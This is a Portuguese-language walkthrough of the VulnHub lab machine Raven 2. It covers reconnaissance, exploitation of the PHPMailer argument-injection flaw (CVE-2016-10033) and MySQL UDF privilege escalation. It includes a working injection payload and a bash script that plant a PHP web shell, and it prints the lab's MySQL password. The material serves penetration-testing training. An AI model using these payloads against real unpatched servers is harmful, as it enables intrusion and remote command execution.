---
title: "VulnHub - Raven 2"
tags: [Linux,Medium,Wordpress,BurpSuite,Linpeas,Web,UDF]
categories: VulnHub OSWE
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/inicial.png)

Link: [Raven 2](https://www.vulnhub.com/entry/raven-2,269/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/nmap1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/nmap2.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

### Verificamos que temos 4 portas aberta no servidor

> Porta 22 -> SSH

> Porta 80 -> Web

> Porta 111 -> RPC

> Porta 44452 -> RPC

## Enumeração da Porta 80

Abrimos pra ver do que se trata

Verificamos que é uma página de login

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/web.png)

No código fonte não verificamos nada de estranho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/web1.png)

Rodamos o Gobuster pra ver se encontramos algo

```bash
gobuster dir -u http://192.168.56.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/gobuster.png)

### Wordpress

Acessando o http://192.168.56.135/wordpress verificamos que tem wp rodando nesse servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/wp.png)

Olhando o código fonte, vemos que ele está chamando o `raven.local`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/wp1.png)

Alteramos o /etc/hosts pra podermos ver a webpage corretamente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/wp2.png)

Agora acessamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/wp3.png)

Bom, fiz diversas enumerações no wordpress e não encontrei nada de extremamente vulnerável nele

Com o `wpscan` enumeramos algumas coisas

```bash
wpscan --url http://raven.local/wordpress/ -e u --no-banner --no-update --api-token [....]
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/wp4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/wp5.png)

Usuários encontrados: **steven** e **michael**, com eles podemos tentar algum tipo de brute force na máquina depois também. Tirando isso não encontrei nada de importante nesse wordpress

### /vendor

Vendo as outras saidas do `Gobuster` temos essa pasta `/vendor` também

Encontramos uma flag nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/flag1.png)

O que chamou atenção foi esse `PHPMailerAutoload.php`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/vendor.png)

No arquivo `VERSION` encontramos a versão dele, 5.2.16

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/vendor1.png)

## PHPSendMail

https://www.fortinet.com/blog/threat-research/analysis-of-phpmailer-remote-code-execution-vulnerability-cve-2016-10033

Vamos tentar explicar como funciona a vulnerabilidade, e encontrar um modo manual de explorar ela

Quando utilizamos od PHPMail pra enviar um e-mail, o processo normal que ele faz é o seguinte:

1. PHPMailer pega as requisições que foram passadas pelo usuário

2. Faz a validação das requisições

3. Manda os dados para a função mail() para o que o e-mail seja enviado

A segunda fase está descrita na imagem a baixo, onde ele apenas faz a validação das requisições, sem necessariamente fazer a correta sanitização dela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/send.png)

Por exemplo, o valor de $address que seja "ataque -InjectParam @teste.com" vai ser rejeitado. Mas o método que o código utiliza, que segue a RFC3969, que diz que e-mail pode contar espaços quando estão protegidos por aspas, então se for ""ataque -InjectParam"@teste.com" vai ser aceito ao filtro que é aplicado no código acima.

Depois dessa validação, PHPMailer vai enviar os dados do usuário para a função mail(), que vai enviar o e-mail em si.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/send1.png)

O probelma nisso tudo é que o PHPMailer não faz a esterialização.

Por exemplo, quando mandamos a requisição

`"ataque -Parametro"@teste.com"`

A função mail() vai executar o /usr/bin/sendmail com 4 argumentos

1. /usr/bin/sendmail
2. -t
3. -i
4. -fattacker -Parametro@teste.com

Contudo, o atacante pode quebrar esse quarto argumento injetando um "\".

`ataque\"-Parametro1 -Parametro2"@teste.com`

A função mail() vai executar o /usr/bin/sendmail com 6 argumentos

1. /usr/bin/sendmail
2. -t
3. -i
4. -fattacker
5. -Parametro1
6. -Parametro2@teste.com

Vizualisando isso vamos reproduzir nesse campo de `contact.php`, primeiro vamos explorar de forma manual, depois vamos automatizar com um exploit já pronto.

## Exploração Manual

https://www.fortinet.com/blog/threat-research/analysis-of-phpmailer-remote-code-execution-vulnerability-cve-2016-10033

A ideia desse exploit, é no campo `contact.php`, o PHPMailer funciona pra isso, pra envio de e-mails, o único lugar que podemos verificar isso é ali

Jogamos uma requisição dele para o BurpSuite para melhor trabalharmos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/a.png)

Aqui conseguimos ver os parâmetros que ele pede

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/a1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/a2.png)

Agora montamos nosso payload em cima do que foi explicado acima

```
name=Hacker
email="hacker\" -oQ/tmp -X/var/www/html/shell.php rce"@rce.com
message=<?php echo shell_exec($_GET['cmd']); ?>
```

Jogamos tudo isso no corpo da requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/b3.png)

Agora enviamos para a página web e acessamos via navegador o /shell.php e temos RCE!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/a3.png)

Agora pegamos um reverse shell

Enviamos para o Burp

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/a4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/a5.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/a6.png)

Shell!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/a7.png)

## Script

Podemos também utilizar um script em bash para o envio da requisição, uma vez que são passados apenas alguns parâmetros

exploit.sh
```bash
#!/bin/bash

TARGET=http://raven.local/contact.php

DOCROOT=/var/www/html
FILENAME=bash.php
LOCATION=$DOCROOT/$FILENAME

STATUS=$(curl -s \
              --data-urlencode "name=Bash" \
              --data-urlencode "email=\"Bash\\\" -oQ/tmp -X$LOCATION bash\"@bash.com" \
              --data-urlencode "message=<?php echo shell_exec(\$_GET['cmd']); ?>" \
              --data-urlencode "action=submit" \
              $TARGET | sed -r '146!d')

if grep 'instantiate' &>/dev/null <<<"$STATUS"; then
  echo "[+] Check ${LOCATION}?cmd=[shell command, e.g. id]"
else
  echo "[!] Exploit failed"
fi
```

Aqui está ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/a8.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/e9.png)

Temos RCE!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/a9.png)

# Automatizado

Agora pesquisamos por exploit para ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/exp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/exp1.png)

https://www.exploit-db.com/exploits/40974

Baixamos eles para nossa máquina e tentamos utilizar, não sei por que ele não deu muito certo, depois com mais tempo eu debugo melhor isso.

# Escalando Privilégio

Navegando na máquina encontramos mais algumas flags

Flag2

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/flag2.png)

Flag3

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/flag3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/flag33.png)

## Linpeas

Executamos o Linpeas para procurar por pontos para escalar privilégio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/lin0.png)

Baixamos na nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/lin.png)

Executamos na máquina Raven

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/lin1.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/lin11.png)

Opa! Senha do Mysql

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/lin2.png)

Opa! MySQL sendo executado como ROOT

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/lin3.png)

## MySQL Local Privilege Escalation - UDF

Mysql normalmente não é executado com permissões de root, isso nos abre a possibilidade de diversos pontos para escalação de privilégio nessa máquina, também se verificarmos a versão dele, é uma versão antiga

5.5.60

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/lin4.png)

Pesquisando por exploits, encontramos alguns que podemos utilizar para a escalação local de privilégio nessa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/mysql.png)

A ideia aqui é explorar o User Defined Functions (UDF) do SQL que está sendo executado como root

https://www.exploit-db.com/exploits/1518

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/mysql1.png)

É só seguirmos o que está previsto no exploit

Compilamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/comp.png)

Acessamos o mysql com as credenciais de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/comp1.png)

Adicionamos a library nos plugins do mysql
R@v3nSecurity

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/comp2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/comp3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/comp4.png)

Agora criamos a função `do_system` pra podermos executar comandos na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/comp5.png)

Agora pegamos uma reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-raven2/comp6.png)

